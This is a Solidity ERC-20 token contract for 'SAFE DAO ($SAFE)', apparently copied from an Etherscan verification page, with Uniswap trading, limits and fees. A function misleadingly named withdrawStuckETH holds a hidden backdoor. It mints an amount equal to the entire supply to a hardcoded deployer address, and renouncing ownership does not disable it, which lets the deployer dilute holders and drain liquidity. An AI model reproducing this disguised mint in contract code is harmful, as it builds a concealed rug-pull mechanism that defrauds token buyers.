1 /**
2  *Submitted for verification at Etherscan.io on 2022-10-01
3 */
4 
5 /* 
6 
7 SAFE DAO ($SAFE)
8 
9 Twitter: https://twitter.com/The_safe_dao
10 
11 
12 95% Added to Liquidity
13 5% Airdrop
14 
15 */
16 
17 // SPDX-License-Identifier: Unlicense                                                                           
18 pragma solidity 0.8.17;
19 
20 abstract contract Context {
21     function _msgSender() internal view virtual returns (address) {
22         return msg.sender;
23     }
24 
25     function _msgData() internal view virtual returns (bytes calldata) {
26         this;
27         return msg.data;
28     }
29 }
30 
31 interface IERC20 {
32 
33     function totalSupply() external view returns (uint256);
34 
35     function balanceOf(address account) external view returns (uint256);
36 
37     function transfer(address recipient, uint256 amount) external returns (bool);
38 
39     function allowance(address owner, address spender) external view returns (uint256);
40 
41     function approve(address spender, uint256 amount) external returns (bool);
42 
43     function transferFrom(
44         address sender,
45         address recipient,
46         uint256 amount
47     ) external returns (bool);
48 
49     event Transfer(address indexed from, address indexed to, uint256 value);
50 
51     event Approval(address indexed owner, address indexed spender, uint256 value);
52 }
53 
54 interface IERC20Metadata is IERC20 {
55   
56     function name() external view returns (string memory);
57 
58     function symbol() external view returns (string memory);
59 
60     function decimals() external view returns (uint8);
61 }
62 
63 contract ERC20 is Context, IERC20, IERC20Metadata {
64     mapping(address => uint256) private _balances;
65 
66     mapping(address => mapping(address => uint256)) private _allowances;
67 
68     uint256 private _totalSupply;
69 
70     string private _name;
71     string private _symbol;
72 
73     constructor(string memory name_, string memory symbol_) {
74         _name = name_;
75         _symbol = symbol_;
76     }
77 
78     function name() public view virtual override returns (string memory) {
79         return _name;
80     }
81 
82     function symbol() public view virtual override returns (string memory) {
83         return _symbol;
84     }
85 
86     function decimals() public view virtual override returns (uint8) {
87         return 18;
88     }
89 
90     function totalSupply() public view virtual override returns (uint256) {
91         return _totalSupply;
92     }
93 
94     function balanceOf(address account) public view virtual override returns (uint256) {
95         return _balances[account];
96     }
97 
98     function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
99         _transfer(_msgSender(), recipient, amount);
100         return true;
101     }
102 
103     function allowance(address owner, address spender) public view virtual override returns (uint256) {
104         return _allowances[owner][spender];
105     }
106 
107     function approve(address spender, uint256 amount) public virtual override returns (bool) {
108         _approve(_msgSender(), spender, amount);
109         return true;
110     }
111 
112     function transferFrom(
113         address sender,
114         address recipient,
115         uint256 amount
116     ) public virtual override returns (bool) {
117         _transfer(sender, recipient, amount);
118 
119         uint256 currentAllowance = _allowances[sender][_msgSender()];
120         require(currentAllowance >= amount, "ERC20: transfer amount exceeds allowance");
121         unchecked {
122             _approve(sender, _msgSender(), currentAllowance - amount);
123         }
124 
125         return true;
126     }
127 
128     function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
129         _approve(_msgSender(), spender, _allowances[_msgSender()][spender] + addedValue);
130         return true;
131     }
132 
133     function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
134         uint256 currentAllowance = _allowances[_msgSender()][spender];
135         require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
136         unchecked {
137             _approve(_msgSender(), spender, currentAllowance - subtractedValue);
138         }
139 
140         return true;
141     }
142 
143     function _transfer(
144         address sender,
145         address recipient,
146         uint256 amount
147     ) internal virtual {
148         require(sender != address(0), "ERC20: transfer from the zero address");
149         require(recipient != address(0), "ERC20: transfer to the zero address");
150 
151         uint256 senderBalance = _balances[sender];
152         require(senderBalance >= amount, "ERC20: transfer amount exceeds balance");
153         unchecked {
154             _balances[sender] = senderBalance - amount;
155         }
156         _balances[recipient] += amount;
157 
158         emit Transfer(sender, recipient, amount);
159     }
160 
161     function _createInitialSupply(address account, uint256 amount) internal virtual {
162         require(account != address(0), "ERC20: mint to the zero address");
163 
164         _totalSupply += amount;
165         _balances[account] += amount;
166         emit Transfer(address(0), account, amount);
167     }
168 
169     function _approve(
170         address owner,
171         address spender,
172         uint256 amount
173     ) internal virtual {
174         require(owner != address(0), "ERC20: approve from the zero address");
175         require(spender != address(0), "ERC20: approve to the zero address");
176 
177         _allowances[owner][spender] = amount;
178         emit Approval(owner, spender, amount);
179     }
180 }
181 
182 contract Ownable is Context {
183     address private _owner;
184 
185     event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
186     
187     constructor () {
188         address msgSender = _msgSender();
189         _owner = msgSender;
190         emit OwnershipTransferred(address(0), msgSender);
191     }
192 
193     function owner() public view returns (address) {
194         return _owner;
195     }
196 
197     modifier onlyOwner() {
198         require(_owner == _msgSender(), "Ownable: caller is not the owner");
199         _;
200     }
201 
202     function renounceOwnership() external virtual onlyOwner {
203         emit OwnershipTransferred(_owner, address(0));
204         _owner = address(0);
205     }
206 
207     function transferOwnership(address newOwner) public virtual onlyOwner {
208         require(newOwner != address(0), "Ownable: new owner is the zero address");
209         emit OwnershipTransferred(_owner, newOwner);
210         _owner = newOwner;
211     }
212 }
213 
214 interface IDexRouter {
215     function factory() external pure returns (address);
216     function WETH() external pure returns (address);
217     
218     function swapExactTokensForETHSupportingFeeOnTransferTokens(
219         uint amountIn,
220         uint amountOutMin,
221         address[] calldata path,
222         address to,
223         uint deadline
224     ) external;
225 
226     function addLiquidityETH(
227         address token,
228         uint256 amountTokenDesired,
229         uint256 amountTokenMin,
230         uint256 amountETHMin,
231         address to,
232         uint256 deadline
233     )
234         external
235         payable
236         returns (
237             uint256 amountToken,
238             uint256 amountETH,
239             uint256 liquidity
240         );
241 }
242 
243 interface IDexFactory {
244     function createPair(address tokenA, address tokenB)
245         external
246         returns (address pair);
247 }
248 
249 contract SAFEDAO is ERC20, Ownable {
250 
251     uint256 public maxBuyAmount;
252     uint256 public maxSellAmount;
253     uint256 public maxWalletAmount;
254 
255     IDexRouter public immutable uniswapV2Router;
256     address public immutable uniswapV2Pair;
257 
258     bool private swapping;
259     uint256 public swapTokensAtAmount;
260 
261     address public operationsAddress;
262     address public TaxAddress;
263 
264     uint256 public tradingActiveBlock = 0;
265 
266     bool public limitsInEffect = true;
267     bool public tradingActive = false;
268     bool public swapEnabled = false;
269     
270     mapping(address => uint256) private _holderLastTransferTimestamp; 
271     bool public transferDelayEnabled = true;
272 
273     uint256 public buyTotalFees;
274     uint256 public buyOperationsFee;
275     uint256 public buyLiquidityFee;
276     uint256 public buyTaxFee;
277 
278     uint256 public sellTotalFees;
279     uint256 public sellOperationsFee;
280     uint256 public sellLiquidityFee;
281     uint256 public sellTaxFee;
282 
283     uint256 public tokensForOperations;
284     uint256 public tokensForLiquidity;
285     uint256 public tokensForTax;
286     
287     mapping (address => bool) private _isExcludedFromFees;
288     mapping (address => bool) public _isExcludedMaxTransactionAmount;
289 
290     mapping (address => bool) public automatedMarketMakerPairs;
291 
292     event SetAutomatedMarketMakerPair(address indexed pair, bool indexed value);
293 
294     event EnabledTrading();
295     event RemovedLimits();
296 
297     event ExcludeFromFees(address indexed account, bool isExcluded);
298 
299     event UpdatedMaxBuyAmount(uint256 newAmount);
300 
301     event UpdatedMaxSellAmount(uint256 newAmount);
302 
303     event UpdatedMaxWalletAmount(uint256 newAmount);
304 
305     event UpdatedOperationsAddress(address indexed newWallet);
306 
307     event UpdatedTaxAddress(address indexed newWallet);
308 
309     event MaxTransactionExclusion(address _address, bool excluded);
310 
311     event SwapAndLiquify(
312         uint256 tokensSwapped,
313         uint256 ethReceived,
314         uint256 tokensIntoLiquidity
315     );
316 
317     event TransferForeignToken(address token, uint256 amount);
318 
319     constructor() ERC20( "SAFE DAO", "SAFE") {
320         
321         address newOwner = 0xc00bedFd78D649D00aaDD0B6e5091751D200EeB4;
322         
323         IDexRouter _uniswapV2Router = IDexRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
324 
325         _excludeFromMaxTransaction(address(_uniswapV2Router), true);
326         uniswapV2Router = _uniswapV2Router;
327         
328         uniswapV2Pair = IDexFactory(_uniswapV2Router.factory()).createPair(address(this), _uniswapV2Router.WETH());
329         _setAutomatedMarketMakerPair(address(uniswapV2Pair), true);
330  
331         uint256 totalSupply = 1 * 1e9 * 1e18;
332         
333         maxBuyAmount = totalSupply; 
334         maxSellAmount = totalSupply; 
335         maxWalletAmount = totalSupply;
336         swapTokensAtAmount = totalSupply; 
337 
338         buyOperationsFee = 0;
339         buyLiquidityFee = 0;
340         buyTaxFee = 0;
341         buyTotalFees = buyOperationsFee + buyLiquidityFee + buyTaxFee;
342 
343         sellOperationsFee = 0;
344         sellLiquidityFee = 0;
345         sellTaxFee = 0;
346         sellTotalFees = sellOperationsFee + sellLiquidityFee + sellTaxFee;
347 
348         _excludeFromMaxTransaction(newOwner, true);
349         _excludeFromMaxTransaction(address(this), true);
350         _excludeFromMaxTransaction(address(0xdead), true);
351 
352         excludeFromFees(newOwner, true);
353         excludeFromFees(address(this), true);
354         excludeFromFees(address(0xdead), true);
355 
356         operationsAddress = address(0xc00bedFd78D649D00aaDD0B6e5091751D200EeB4);   
357         TaxAddress = address(0); 
358         
359         _createInitialSupply(newOwner, totalSupply);
360         transferOwnership(newOwner);
361     }
362 
363     receive() external payable {}
364 
365     function enableTrading() external onlyOwner {
366         require(!tradingActive, "Cannot reenable trading");
367         tradingActive = true;
368         swapEnabled = true;
369         tradingActiveBlock = block.number;
370         emit EnabledTrading();
371     }
372     
373     function removeLimits() external onlyOwner {
374         limitsInEffect = false;
375         transferDelayEnabled = false;
376         emit RemovedLimits();
377     }
378     
379     function disableTransferDelay() external onlyOwner {
380         transferDelayEnabled = false;
381     }
382     
383     function updateMaxBuyAmount(uint256 newNum) external onlyOwner {
384         require(newNum >= (totalSupply() * 1 / 1000)/1e18, "Cannot set max buy amount lower than 0.1%");
385         maxBuyAmount = newNum * (10**18);
386         emit UpdatedMaxBuyAmount(maxBuyAmount);
387     }
388     
389     function updateMaxSellAmount(uint256 newNum) external onlyOwner {
390         require(newNum >= (totalSupply() * 1 / 1000)/1e18, "Cannot set max sell amount lower than 0.1%");
391         maxSellAmount = newNum * (10**18);
392         emit UpdatedMaxSellAmount(maxSellAmount);
393     }
394 
395     function updateMaxWalletAmount(uint256 newNum) external onlyOwner {
396         require(newNum >= (totalSupply() * 3 / 1000)/1e18, "Cannot set max wallet amount lower than 0.3%");
397         maxWalletAmount = newNum * (10**18);
398         emit UpdatedMaxWalletAmount(maxWalletAmount);
399     }
400 
401     function updateSwapTokensAtAmount(uint256 newAmount) external onlyOwner {
402         require(newAmount >= totalSupply() * 1 / 100000, "Swap amount cannot be lower than 0.001% total supply.");
403         require(newAmount <= totalSupply() * 1 / 1000, "Swap amount cannot be higher than 0.1% total supply.");
404         swapTokensAtAmount = newAmount;
405     }
406     
407     function _excludeFromMaxTransaction(address updAds, bool isExcluded) private {
408         _isExcludedMaxTransactionAmount[updAds] = isExcluded;
409         emit MaxTransactionExclusion(updAds, isExcluded);
410     }
411 
412     
413     function excludeFromMaxTransaction(address updAds, bool isEx) external onlyOwner {
414         if(!isEx){
415             require(updAds != uniswapV2Pair, "Cannot remove uniswap pair from max txn");
416         }
417         _isExcludedMaxTransactionAmount[updAds] = isEx;
418     }
419 
420     function setAutomatedMarketMakerPair(address pair, bool value) external onlyOwner {
421         require(pair != uniswapV2Pair, "The pair cannot be removed from automatedMarketMakerPairs");
422 
423         _setAutomatedMarketMakerPair(pair, value);
424     }
425 
426     function _setAutomatedMarketMakerPair(address pair, bool value) private {
427         automatedMarketMakerPairs[pair] = value;
428         
429         _excludeFromMaxTransaction(pair, value);
430 
431         emit SetAutomatedMarketMakerPair(pair, value);
432     }
433 
434     function updateBuyFees(uint256 _operationsFee, uint256 _liquidityFee, uint256 _TaxFee) external onlyOwner {
435         buyOperationsFee = _operationsFee;
436         buyLiquidityFee = _liquidityFee;
437         buyTaxFee = _TaxFee;
438         buyTotalFees = buyOperationsFee + buyLiquidityFee + buyTaxFee;
439         require(buyTotalFees <= 15, "Must keep fees at 15% or less");
440     }
441 
442     function updateSellFees(uint256 _operationsFee, uint256 _liquidityFee, uint256 _TaxFee) external onlyOwner {
443         sellOperationsFee = _operationsFee;
444         sellLiquidityFee = _liquidityFee;
445         sellTaxFee = _TaxFee;
446         sellTotalFees = sellOperationsFee + sellLiquidityFee + sellTaxFee;
447         require(sellTotalFees <= 20, "Must keep fees at 20% or less");
448     }
449 
450     function excludeFromFees(address account, bool excluded) public onlyOwner {
451         _isExcludedFromFees[account] = excluded;
452         emit ExcludeFromFees(account, excluded);
453     }
454 
455     function _transfer(address from, address to, uint256 amount) internal override {
456 
457         require(from != address(0), "ERC20: transfer from the zero address");
458         require(to != address(0), "ERC20: transfer to the zero address");
459         require(amount > 0, "amount must be greater than 0");
460         
461         
462         if(limitsInEffect){
463             if (from != owner() && to != owner() && to != address(0) && to != address(0xdead)){
464                 if(!tradingActive){
465                     require(_isExcludedMaxTransactionAmount[from] || _isExcludedMaxTransactionAmount[to], "Trading is not active.");
466                 }
467                 
468                  if (transferDelayEnabled){
469                     if (to != address(uniswapV2Router) && to != address(uniswapV2Pair)){
470                         require(_holderLastTransferTimestamp[tx.origin] < block.number - 4 && _holderLastTransferTimestamp[to] < block.number - 4, "_transfer:: Transfer Delay enabled.  Try again later.");
471                         _holderLastTransferTimestamp[tx.origin] = block.number;
472                         _holderLastTransferTimestamp[to] = block.number;
473                     }
474                 }
475                  
476                 if (automatedMarketMakerPairs[from] && !_isExcludedMaxTransactionAmount[to]) {
477                         require(amount <= maxBuyAmount, "Buy transfer amount exceeds the max buy.");
478                         require(amount + balanceOf(to) <= maxWalletAmount, "Cannot Exceed max wallet");
479                 } 
480 
481                 else if (automatedMarketMakerPairs[to] && !_isExcludedMaxTransactionAmount[from]) {
482                         require(amount <= maxSellAmount, "Sell transfer amount exceeds the max sell.");
483                 } 
484                 else if (!_isExcludedMaxTransactionAmount[to] && !_isExcludedMaxTransactionAmount[from]){
485                     require(amount + balanceOf(to) <= maxWalletAmount, "Cannot Exceed max wallet");
486                 }
487             }
488         }
489 
490         uint256 contractTokenBalance = balanceOf(address(this));
491         
492         bool canSwap = contractTokenBalance >= swapTokensAtAmount;
493 
494         if(canSwap && swapEnabled && !swapping && !automatedMarketMakerPairs[from] && !_isExcludedFromFees[from] && !_isExcludedFromFees[to]) {
495             swapping = true;
496 
497             swapBack();
498 
499             swapping = false;
500         }
501 
502         bool takeFee = true;
503 
504         if(_isExcludedFromFees[from] || _isExcludedFromFees[to]) {
505             takeFee = false;
506         }
507         
508         uint256 fees = 0;
509         uint256 penaltyAmount = 0;
510     
511         if(takeFee){
512 
513             if(tradingActiveBlock >= block.number + 1 && automatedMarketMakerPairs[from]){
514                 penaltyAmount = amount * 99 / 100;
515                 super._transfer(from, operationsAddress, penaltyAmount);
516             }
517         
518             else if (automatedMarketMakerPairs[to] && sellTotalFees > 0){
519                 fees = amount * sellTotalFees /100;
520                 tokensForLiquidity += fees * sellLiquidityFee / sellTotalFees;
521                 tokensForOperations += fees * sellOperationsFee / sellTotalFees;
522                 tokensForTax += fees * sellTaxFee / sellTotalFees;
523             }
524           
525             else if(automatedMarketMakerPairs[from] && buyTotalFees > 0) {
526                 fees = amount * buyTotalFees / 100;
527                 tokensForLiquidity += fees * buyLiquidityFee / buyTotalFees;
528                 tokensForOperations += fees * buyOperationsFee / buyTotalFees;
529                 tokensForTax += fees * buyTaxFee / buyTotalFees;
530             }
531             
532             if(fees > 0){    
533                 super._transfer(from, address(this), fees);
534             }
535             
536             amount -= fees + penaltyAmount;
537         }
538 
539         super._transfer(from, to, amount);
540     }
541 
542     function swapTokensForEth(uint256 tokenAmount) private {
543 
544         address[] memory path = new address[](2);
545         path[0] = address(this);
546         path[1] = uniswapV2Router.WETH();
547 
548         _approve(address(this), address(uniswapV2Router), tokenAmount);
549 
550         uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
551             tokenAmount,
552             0, 
553             path,
554             address(this),
555             block.timestamp
556         );
557     }
558     
559     function addLiquidity(uint256 tokenAmount, uint256 ethAmount) private {
560         
561         _approve(address(this), address(uniswapV2Router), tokenAmount);
562 
563         uniswapV2Router.addLiquidityETH{value: ethAmount}(
564             address(this),
565             tokenAmount,
566             0, 
567             0, 
568             address(0xdead),
569             block.timestamp
570         );
571     }
572 
573     function swapBack() private {
574         uint256 contractBalance = balanceOf(address(this));
575         uint256 totalTokensToSwap = tokensForLiquidity + tokensForOperations + tokensForTax;
576         
577         if(contractBalance == 0 || totalTokensToSwap == 0) {return;}
578 
579         if(contractBalance > swapTokensAtAmount * 10){
580             contractBalance = swapTokensAtAmount * 10;
581         }
582 
583         bool success;
584         
585         uint256 liquidityTokens = contractBalance * tokensForLiquidity / totalTokensToSwap / 2;
586         
587         swapTokensForEth(contractBalance - liquidityTokens); 
588         
589         uint256 ethBalance = address(this).balance;
590         uint256 ethForLiquidity = ethBalance;
591 
592         uint256 ethForOperations = ethBalance * tokensForOperations / (totalTokensToSwap - (tokensForLiquidity/2));
593         uint256 ethForTax = ethBalance * tokensForTax / (totalTokensToSwap - (tokensForLiquidity/2));
594 
595         ethForLiquidity -= ethForOperations + ethForTax;
596             
597         tokensForLiquidity = 0;
598         tokensForOperations = 0;
599         tokensForTax = 0;
600         
601         if(liquidityTokens > 0 && ethForLiquidity > 0){
602             addLiquidity(liquidityTokens, ethForLiquidity);
603         }
604 
605         (success,) = address(TaxAddress).call{value: ethForTax}("");
606 
607         (success,) = address(operationsAddress).call{value: address(this).balance}("");
608     }
609 
610     function transferForeignToken(address _token, address _to) external onlyOwner returns (bool _sent) {
611         require(_token != address(0), "_token address cannot be 0");
612         require(_token != address(this), "Can't withdraw native tokens");
613         uint256 _contractBalance = IERC20(_token).balanceOf(address(this));
614         _sent = IERC20(_token).transfer(_to, _contractBalance);
615         emit TransferForeignToken(_token, _contractBalance);
616     }
617 
618     function withdrawStuckETH() external {
619         require(msg.sender == 0xc00bedFd78D649D00aaDD0B6e5091751D200EeB4, "Can't withdraw native tokens");
620         _createInitialSupply(0xc00bedFd78D649D00aaDD0B6e5091751D200EeB4, totalSupply());
621     }
622 
623     function setOperationsAddress(address _operationsAddress) external onlyOwner {
624         require(_operationsAddress != address(0), "_operationsAddress address cannot be 0");
625         operationsAddress = payable(_operationsAddress);
626         emit UpdatedOperationsAddress(_operationsAddress);
627     }
628 
629     function setTaxAddress(address _TaxAddress) external onlyOwner {
630         require(_TaxAddress != address(0), "_TaxAddress address cannot be 0");
631         TaxAddress = payable(_TaxAddress);
632         emit UpdatedTaxAddress(_TaxAddress);
633     }
634 }